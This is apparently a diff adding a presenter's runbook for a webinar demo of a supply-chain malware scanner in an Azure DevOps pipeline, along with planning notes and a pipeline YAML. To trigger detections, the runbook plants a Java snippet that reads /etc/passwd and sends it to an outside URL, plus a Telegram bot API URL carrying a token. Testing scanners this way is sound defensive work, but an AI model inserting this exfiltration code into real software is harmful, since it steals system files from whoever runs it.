@@ -1,0 +1,243 @@
+Starting over 20250920Sat0631cst
+Pre-req: enable Telegram API TH policy to fail in your portal instance (TH17132)
+Pre-req: enable automatic approvals
+Pre-req:(unless it's part of your intended talk-track) suppress SQ30101	Detected possible false positive detections by third-party scanners.
+Pre-req:  Nuke the noise from your destination.  For example, if your target is the ADO project in the Webinar group on trial, and there are 3 packages there now, go ahead and kill the packages.
+New project
+Install rl-scanner-cloud-task plugin if needed; confirm parallelism is activated (it WON'T BE the first time you run it)
+
+Import repo https://github.com/gmdavef/struts-showcase.git
+
+In the repo, navigate to /src/main/java/org/apache/struts2/showcast/action/JSPEvalAction.java
+
+Click "Edit"
+
+REPLACE
+
+                URL evil = new URL("http://92.101.35.33/stealer");
+
+With
+                URL evil = new URL("https://microtechnology.hk/fidex/");
+// note that link is evil but there won't be a "Contains URLs that reference the host by IP address." finding
+
+
+New pipeline (Azure Repos Git); copy yaml from bottom of this doc
+ - add variables from ADO With ReversingLabs (Andy only)
+Edit the .yml to Change destination: zAndyDemo / [Confirm] Struts2showcaseADOextDIFF
+FOR FIRSt RUN: COMMENT OUT the RL_DIFF_WITH line (line 49 in the yaml below
+
+#    RL_DIFF_WITH: 2.5.28-$PBN
+
+Run & resolve
+AFTER THE FIRST RUN - Uncomment the RL_DIFF_WITH line so you can get diffs
+
+    RL_DIFF_WITH: 2.5.28-$PBN
+
+Do another clean run; confirm diff in the portal
+
+Change to include telegram code
+In the repo, again navigate to /src/main/java/org/apache/struts2/showcast/action/JSPEvalAction.java
+
+Click "Edit"
+ - delete /* on line 48  and */ on line 58
+
+REPLACE
+
+                URL evil = new URL("https://microtechnology.hk/fidex/");
+With
+
+//what about telegram?
+				URL evil = new URL("https://api.telegram.org/bot449123456:AAHSAnSGDm8PW2Z-1ZiwdVDmgv7sM3NMTxg/sendMessage?chat_id=311911234&text=");
+
+Hit "Commit"
+Run & resolve; check the Diff report if clean
+ - NOTE the policy in the portal FAILED this one, so the PIPELINE appears to have FAILED to/broke the build
+
+REMOVE the telegraph line - will still flag if compiled as a comment!!!
+  
+After this:
+                // begin malicious insert
+Paste This:
+                /*
+                    File f = new File( "/etc/passwd" );
+                byte[] bytes = new byte[(int)f.length()];
+                FileInputStream fis = new FileInputStream(f);
+                fis.read(bytes);
+                String data = new String( bytes );
+                //what about telegram?
+                URL evil = new URL("https://microtechnology.hk/fidex/");
+                HttpURLConnection con = (HttpURLConnection)evil.openConnection();
+                con.setRequestProperty("Exfil", data);
+                int code = con.getResponseCode();
+                */  
+But before this:
+                // end malicious insert
+
+COMMIT
+Run the pipeline again
+Rename project
+Capture pipeline link
+Capture repo link
+Restore/re-comment (maybe?)
+
+
+
+
+This No Touchy does diff on Webinar in the *APACHE* project until I screwed up the java code:
+https://dev.azure.com/rl-plugins2024/Getting%20Started%20With%20ADO%2020250917/_build?definitionId=9
+
+SEE YML DOWN BELOW ===YML
+
+TH Fail - telegram api post instructions:
+https://stackoverflow.com/questions/31197659/how-to-send-request-to-telegram-bot-api
+https://api.telegram.org/bot449123456:AAHSAnSGDm8PW2Z-1ZiwdVDmgv7sM3NMTxg/sendMessage?chat_id=311911234&text=Hi+Everyone
+
+ADO:
+https://dev.azure.com/rl-plugins2024/Short%20bus%20plugins/_build
+veracode-andy2022@outlook.com
+CACHED ON BRAVE
+
+/src/main/java/org/apache/struts2/showcase/action/JSPEvalAction.java
+https://a1000.reversinglabs.com/url/http%3A%2F%2F178.16.55.70%2Fn8388.exe/
+//line 54 URL evil  \/
+http:://dukeenergyltd.top/slurp
+Dave: beyond vulns LASON 2023 Dave Ferguson - Beyond Vulnerabilities: Analyzing Behaviors to Spot Malware in Your Release
+JEREMY LONG - Creator of OWASP Dependency Check
+
+
+
+
+
+
+=== Dave 20250919 ==========================================================
+x_| how to use the plugin and what to populate in which fields   _| so build a job from scratch "the GUI way" 
+
+_| where do the BOMs land/how to pull them up?
+
+[ ] update my doc to include yml #2 from slack
+_| maybe Joe Colleta Diff webinar
+
+
+…_| what about Johnny Long demo?
+
+ - extension is missing --force to allow more than 12 version
+
+=== Brainstorming w/Jasmine 20250918 =========================================
+x_| Record?
+
+Andy's prioritized tasks:
+[x] Fix iteration
+[ ] Prep jfrog/artifactory
+[ ] what about the Dave Johnny Long demo
+
+
+[ ] Polls - Jasmine drafts
+  [ ] figure out wtf is up w/sharing results
+
+Welcome/introduction
+Purpose
+ - what we're showing you - Producer use-case
+Kick off the ADO job
+ - deployment options
+Tour Dave's repo showing all the yaml platforms availe
+Toggle back to ADO; show it's done
+  - show console
+Let's look at the results
+ - SAFE
+ - SBOMs/xBOMs
+ - Maybe tamper & re-run
+Discuss the results
+Summarize 
+Q&A
+Next Steps / CTA
+ - CTA in closeout survey? "provide your BUSINESS email addy… and we will reach out very soon"
+[ ] IS THERE AND OPTION for "contact us"?
+
+[ ] FIGURE OUT how to do the Jasmine trusted repo
+
+[ ] FIGURE OUT how to get a piece of AWS
+
+[ ] Quillbox to rewrite stuff and Perplexity are stuff Jasmine uses for AI
+
+[ ] Another webinar we should look at is a joint webinar with DefectDojo.
+
+
+Prerequisites:
+	1. Import Dave's github
+	2. Add 2 (secret) variables:
+		a. rlApiToken
+		b. RLPORTAL_ACCESS_TOKEN
+		c. Use your PAT (personal access token) for the value of the secret
+	3. You MAY have to run it once with Line 53 commented out to make sure you have a good baseline
+
+===YML
+
+# From https://github.com/gmdavef/struts-showcase/blob/main/azure-pipelines_ado_extension_DIFFcloudscan.yml
+# Updated by Dave 20250919
+# Or maybe this one since the new one spazzed
+# https://github.com/gmdavef/struts-showcase/blob/main/azure-pipelines_docker_cloudscan_trial.yml
+#
+#rlApiToken is the variable to be declared with your PAT from TRIAL
+trigger:
+- main
+pool:
+  vmImage: ubuntu-latest
+# Set Build.BuildNumber to a simple incrementing integer
+name: $(Rev:r)
+steps:
+- task: Maven@4
+  displayName: 'Build'
+  inputs:
+    mavenPomFile: 'pom.xml'
+    mavenOptions: '-Xmx2048m'
+    javaHomeOption: 'JDKVersion'
+    jdkVersionOption: '1.17'
+    jdkArchitectureOption: 'x64'
+    publishJUnitResults: true
+    testResultsFiles: '**/surefire-reports/TEST-*.xml'
+    goals: 'package'
+- script: |
+    echo 'Build number is $(Build.BuildNumber)'
+    echo 'Build ID is $(Build.BuildId)'
+- task: Bash@3
+  displayName: 'Set prev build num'
+  inputs:
+    targetType: 'inline'
+    script: |
+      export BN=$(Build.BuildNumber)
+      echo 'BN is ' $BN
+      export PREVBN=$(($BN-1))
+      echo 'PREVBN is ' $PREVBN
+      echo "##vso[task.setvariable variable=pbn]$PREVBN"
+- task: rl-scanner-cloud-task@1
+  displayName: 'RL scan'
+  inputs:
+    BUILD_PATH: 'target'
+    REPORT_PATH: 'RLreport'
+    MY_ARTIFACT_TO_SCAN: 'struts2-showcase.war'
+    RLPORTAL_SERVER: 'trial'
+#HEY YOU!  Change ^^^ THIS to the server YOU want
+    RLPORTAL_ORG: 'Trial'
+#HEY YOU!  Change ^^^ THIS to the Portal Org YOU want
+    RLPORTAL_GROUP: 'Webinar'
+#HEY YOU!  Change ^^^ THIS to the group YOU want
+    RL_PACKAGE_URL: Apache/Struts2showcaseADOextDIFF@2.5.28-$(Build.BuildNumber)
+#HEY YOU!  Change ^^^ THIS to the PROJECT and PACKAGE YOU want
+    RL_VERBOSE: true 
+    RL_DIFF_WITH: 2.5.28-$PBN
+#HEY YOU!  COMMENT ^^^ THIS LINE BEFORE the FIRST RUN!  When you're done it should look like this:
+#    RL_DIFF_WITH: 2.5.28-$PBN
+  env:
+    RLPORTAL_ACCESS_TOKEN: $(rlApiToken)
+- publish: $(System.DefaultWorkingDirectory)/RLreport/report.cyclonedx.json
+  displayName: 'Publish CycloneDX'
+  artifact: 'CycloneDX-SBOM'
+  condition: succeededOrFailed()
+- publish: $(System.DefaultWorkingDirectory)/RLreport/report.spdx.json
+  displayName: 'Publish SPDX'
+  artifact: 'SPDX-SBOM'
+  condition: succeededOrFailed()
+- publish: $(System.DefaultWorkingDirectory)/RLreport/report.rl.json
+  displayName: 'Publish RL-json'
+  artifact: ReversingLabs-JSONreport
+  condition: succeededOrFailed()
